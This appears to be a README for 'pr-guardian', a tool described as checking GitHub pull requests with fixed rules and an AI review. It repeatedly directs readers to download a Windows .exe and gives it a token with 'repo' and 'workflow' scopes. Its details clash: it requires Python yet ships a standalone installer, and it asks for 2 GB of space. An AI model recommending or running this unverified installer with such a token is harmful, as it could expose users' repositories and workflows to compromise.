# 🛡️ pr-guardian - Simple Pull Request Quality Checker

[![Download pr-guardian](https://img.shields.io/badge/Download-pr--guardian-ff6f61?style=for-the-badge&logo=github)](https://github.com/valentin1046/pr-guardian/releases)

---

## 📋 What is pr-guardian?

pr-guardian is a tool that helps you check the quality of your pull requests (PRs) on GitHub. It works automatically to spot potential problems in your code changes before merging. 

It uses two steps:
1. **Fixed rules** that always check for important issues.
2. **Smart AI help** to understand the context of your changes.

The system first runs clear, strict rules to catch errors. Then it asks AI to review the PR and give feedback in a clear, structured format.

---

## ⚙️ Key Features

- **Secret key scanning:** Finds leaked keys like AWS or GitHub tokens before merging.
- **File sync check:** Makes sure important files like lockfiles match your changes.
- **Test coverage check:** Warns if you forgot to include tests relevant to your change.
- **Minimum permission check:** Reviews GitHub Action permissions to keep your project safe.
- **Breaking change alerts:** Detects big changes and checks for proper notes.

The tool reports issues using:
- Status on GitHub checks (green or red signals)
- Inline comments on specific lines
- Summary comments organizing results by type

It supports popular AI services, including OpenAI's GPT-4o, and several others.

---

## 🖥️ System Requirements

- Windows 10 or later  
- Python 3.11 or higher installed  
- An active GitHub Personal Access Token (PAT) with repository permissions  
- Minimum 2 GB free disk space for installation and running  

---

## 🚀 How to Download and Install on Windows

### Step 1: Visit the download page

Click the button below to go to the official release page. Here you will find the latest Windows installer file.

[![Download at Releases](https://img.shields.io/badge/Go_to_Release_Page-blue?style=for-the-badge)](https://github.com/valentin1046/pr-guardian/releases)

### Step 2: Download the Windows installer

Look for a file with a name like `pr-guardian-setup.exe` or `pr-guardian-x64.exe`. Click on it to download.

### Step 3: Run the installer

Find the downloaded file in your Downloads folder and double-click to start the installation. Follow the on-screen instructions. The installer will set up everything you need.

### Step 4: Prepare your GitHub token

You must create a GitHub Personal Access Token (PAT) with the right permissions:
- Go to GitHub Settings → Developer settings → Personal access tokens
- Click **Generate new token**
- Select needed permissions:  
  - `repo` (to read and write your repositories)  
  - `workflow` (to manage GitHub Actions checks)  
- Save the token safely

### Step 5: Run pr-guardian

Open the Command Prompt (search for "cmd" in the Start menu). Navigate to the folder where pr-guardian installed or added to your path.

Type:

```bash
pr-guardian --token YOUR_GITHUB_TOKEN
```

Replace `YOUR_GITHUB_TOKEN` with the token from Step 4.

This will start the tool and connect it to your GitHub repository. pr-guardian will begin checking any new pull requests automatically.

---

## 📖 How pr-guardian Works

1. **Pull Request Scanning:** Each new PR triggers the tool to run scans.
2. **Deterministic Checks:** Fixed rules scan for problems like security leaks or missing tests.
3. **AI Review:** The LLM (language model) examines code context to find less clear issues.
4. **Results Posted:** The tool posts GitHub Check status and comments with detailed findings.

This approach balances clear rules with smart insights to improve PR quality consistently.

---

## 🔧 Troubleshooting Tips

- Make sure Python 3.11 or newer is installed and available from the command line.
- Confirm your GitHub token has the correct permissions.
- Verify you are running commands from the correct folder or that pr-guardian is added to PATH.
- Restart your machine if the installer requests it.
- If you see errors on startup, check the error message and ensure all needed files are present.

---

## 🛠️ Adjust Settings

You can customize pr-guardian through configuration files or command-line options. These let you:

- Enable or disable specific rules
- Choose which AI provider to use
- Set alert levels for checks
- Configure how and where results are posted

---

## 📥 Download pr-guardian

Visit the release page here to get the latest version for Windows:

[![Official Download](https://img.shields.io/badge/Download_Official-ff6f61?style=for-the-badge)](https://github.com/valentin1046/pr-guardian/releases)